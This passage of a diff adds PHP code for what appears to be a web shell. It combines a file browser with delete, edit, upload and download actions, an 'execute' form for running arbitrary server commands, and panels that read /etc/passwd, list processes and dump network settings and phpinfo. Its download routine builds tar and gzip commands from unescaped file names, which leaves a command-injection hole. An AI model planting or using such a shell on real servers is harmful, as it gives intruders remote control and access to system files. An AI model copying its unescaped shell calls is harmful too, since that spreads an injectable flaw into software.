+		else $actions .= '<img src="?img=delete" alt="" class="disabled" />';
+		// select file
+		$selectFile = '<input type="checkbox" name="selectFile[]" value="'.urlencode($dir.$file).'" />';
+		// generar fila
+		$buffer .= '<tr><td>'.$name.'</td><td>'.fileinode($dir.$file).'</td><td>'.file_perms($dir.$file).'</td><td>'.$user['name'].'</td><td>'.$group['name'].'</td><td>'.file_size($dir.$file).'</td><td>'.$mtime.'</td><td>'.$actions.'</td><td><input type="checkbox" name="files[]" class="browseFiles" value="'.$file.'" /></td></tr>'."\n";
+	}
+	$formAction = $_SERVER['REQUEST_URI'];
+	$buffer .= <<< EOF
+</table>
+<div class="fright">
+	selected files:
+	<select name="filesAction">
+		<option value="download">download</option>
+		<option value="delete">delete</option>
+	</select>
+	<input type="submit" name="" value="do it" />
+</div>
+</form>
+<div class="fleft" style="margin-right: 20px;"><form action="$formAction" method="post">
+	make directory:
+	<input type="text" name="mkdir" size="20" />
+</form></div>
+<div class="fleft"><form action="$formAction" method="post">
+	execute:
+	<input type="text" name="execute" size="34" />
+</form></div>
+<div class="clear"></div>
+<div class="fleft" style="margin-right: 20px;"><form action="$formAction" method="post">
+	create file:
+	<input type="text" name="touch" size="23" />
+</form></div>
+<div class="fleft"><form action="$formAction" method="post" enctype="multipart/form-data">
+	upload:
+	<input type="file" name="upload" />
+	<input type="submit" name="" value="do it" />
+</form></div>
+<div class="clear"></div>
+EOF;
+	return $buffer;	
+}
+
+/**
+ * Entrega los permisos en formato like Unix
+ * @author php.net/fileperms
+ */
+function file_perms($file) {
+	// obtener permisos
+	$permisos = fileperms($file);
+	if (($permisos & 0xC000) == 0xC000) $info = 's';
+	else if (($permisos & 0xA000) == 0xA000) $info = 'l';
+	else if (($permisos & 0x8000) == 0x8000) $info = '-';
+	else if (($permisos & 0x6000) == 0x6000) $info = 'b';
+	else if (($permisos & 0x4000) == 0x4000) $info = 'd';
+	else if (($permisos & 0x2000) == 0x2000) $info = 'c';
+	else if (($permisos & 0x1000) == 0x1000) $info = 'p';
+	else $info = 'u';
+	// permisos del propietario
+	$info .= (($permisos & 0x0100) ? 'r' : '-');
+	$info .= (($permisos & 0x0080) ? 'w' : '-');
+	$info .= (($permisos & 0x0040) ? (($permisos & 0x0800) ? 's' : 'x' ) : (($permisos & 0x0800) ? 'S' : '-'));
+	// permisos del grupo
+	$info .= (($permisos & 0x0020) ? 'r' : '-');
+	$info .= (($permisos & 0x0010) ? 'w' : '-');
+	$info .= (($permisos & 0x0008) ? (($permisos & 0x0400) ? 's' : 'x' ) : (($permisos & 0x0400) ? 'S' : '-'));
+	// permisos de otros
+	$info .= (($permisos & 0x0004) ? 'r' : '-');
+	$info .= (($permisos & 0x0002) ? 'w' : '-');
+	$info .= (($permisos & 0x0001) ? (($permisos & 0x0200) ? 't' : 'x' ) : (($permisos & 0x0200) ? 'T' : '-'));
+	// retornar permsisos
+	return $info;
+}
+
+function file_size ($file) { 
+	return size_format(filesize($file));
+}
+
+function size_format ($size) {
+	$method = array('','K','M','G', 'T');
+	if ($size <= 1024) // B
+		return $size.$method[0];
+	elseif ($size >= pow(1024, 4)) // TB
+		return round($size/pow(1024, 4), 2).$method[4];
+	elseif ($size >= pow(1024, 3)) // GB
+		return round($size/pow(1024, 3), 2).$method[3];
+	elseif ($size >= pow(1024, 2)) // MB
+		return round($size/pow(1024, 2), 2).$method[2];
+	else // KB
+		return round($size/1024, 2).$method[1];
+}
+
+function file_delete ($file) {
+	if(is_dir($file)) rmdir_recursive($file);
+	else unlink($file);
+	header('location: ?dir='.dirname($file));
+}
+
+function file_edit ($file) {
+	echo web1(false);
+	echo '<div><strong>File</strong>: ',$file,'<br /><br /></div>';
+	if(!isset($_POST['save'])) {
+		echo '<form action="?edit=',urlencode($file),'" method="post">';
+		echo '<textarea name="data">',str_replace('</textarea>', '<|textarea>', file_get_contents($file)),'</textarea>';
+		if(is_writable($file)) {
+			echo '<div class="center">';
+			echo '<input type="reset" name="reset" value="Back to the original" />';
+			echo '<input type="submit" name="save" value="Save the file" />';
+			echo '</div>';
+		}
+		echo '</form>';
+	} else {
+		if(file_put_contents(urldecode($file), str_replace('<|textarea>', '</textarea>', $_POST['data']))!==false) {
+			echo 'File modified!';
+		} else {
+			echo 'File NOT modified!';
+		}
+	}
+	echo web2(false);
+}
+
+function file_download ($file, $dir = null) {
+	// para determinar si hay que eliminar o no el archivo despues de descargar
+	$created = false;
+	// si es un arreglo de archivos se empaquetan primero
+	if(is_array($file)) {
+		$name = sys_get_temp_dir().'/'.basename($dir).'.tar';
+		execute('tar cf "'.$name.'" --files-from /dev/null');
+		foreach($file as &$f) {
+			execute('cd "'.$dir.'"; tar rf "'.$name.'" "'.$f.'"');
+		}
+		execute('gzip "'.$name.'"');
+		$file = $name.'.gz';
+		$created = true;
+	}
+	// si el archivo es directorio primero se empaqueta
+	if(is_dir($file)) {
+		$name = sys_get_temp_dir().'/'.basename($file).'.tar.gz';
+		execute('cd "'.dirname($file).'"; tar czf "'.$name.'" "'.basename($file).'"');
+		$file = $name;
+		$created = true;
+	}
+	// descargar archivo
+	if(file_exists($file)) {
+		ob_clean();
+		header ('Content-Disposition: attachment; filename='.basename($file));
+		header ('Content-Type: '.mime_content_type($file));
+		header ('Content-Length: '.filesize($file));
+		readfile($file);
+		// borrar el archivo si corresponde
+		if($created) unlink($file);
+	}
+}
+
+/**
+ * Borra recursivamente un directorio
+ * @param dir Directorio a borrar
+ * @author http://en.kioskea.net/faq/793-warning-rmdir-directory-not-empty
+ * @version 2011-03-24
+ */
+function rmdir_recursive ($dir) {
+	// List the contents of the directory table
+	$dir_content = scandir ($dir);
+	// Is it a directory?
+	if($dir_content!==false) {
+		// For each directory entry
+		foreach ($dir_content as &$entry) {
+			// Unix symbolic shortcuts, we go
+			if (!in_array ($entry, array ('.','..'))) {
+				// We find the path from the beginning
+				$entry = $dir. '/'. $entry;
+				// This entry is not an issue: it clears
+				if (!is_dir($entry)) {
+					unlink ($entry);
+				} else { // This entry is a folder, it again on this issue
+					rmdir_recursive ($entry);
+				}
+			}
+		}
+	}
+	// It has erased all entries in the folder, we can now erase
+	rmdir ($dir);
+}
+
+function debug($data) {
+	echo '<pre>';
+	print_r($data);
+	echo '</pre>';
+}
+
+function users() {
+	$buffer = '';
+	$buffer .= '<h1>Users</h1>'."\n";
+	$file = file_get_contents('/etc/passwd');
+	$users = explode("\n", $file);
+	$buffer .= '<table>'."\n";
+	$buffer .= '<tr><th>user</th><th>uid</th><th>group</th><th>gecos</th><th>home</th><th>shell</th></tr>'."\n";
+	foreach($users as $user) {
+		$field = explode(':', $user);
+		if(isset($field[6])) {
+			$group = posix_getgrgid($field[3]);
+			$buffer .= '<tr><td>'.$field[0].'</td><td>'.$field[2].'</td><td>'.$group['name'].'</td><td>'.$field[4].'</td><td>'.$field[5].'</td><td>'.$field[6].'</td></tr>'."\n";
+		}	
+	}
+	$buffer .= '</table>'."\n";
+	return $buffer;
+}
+
+function process() {
+	$buffer = '';
+	$buffer .= '<h1>Process</h1>'."\n";
+	$buffer .= execute('ps aux');
+	$buffer .= execute('pstree -p');
+	return $buffer;	
+}
+
+function network() {
+	$buffer = '';
+	$buffer .= '<h1>Network</h1>'."\n";
+	$buffer .= execute('/sbin/ifconfig');
+	$buffer .= execute('/sbin/route -n');
+	$buffer .= file_show('/etc/resolv.conf');
+	return $buffer;
+}
+
+function php() {
+	$buffer = '';
+	$buffer .= '<h1>PHP</h1>'."\n";
+	$buffer .= '<iframe src="?phpinfo"></iframe>'."\n";
+	return $buffer;	
+}
+
+function databases() {
+	$buffer = '';
+	$buffer .= '<h1>Databases</h1>'."\n";
+	$buffer .= '<p>Comming soon...</p>'."\n";
+	$buffer .= ''."\n";
+	return $buffer;	
+}
+
+?>
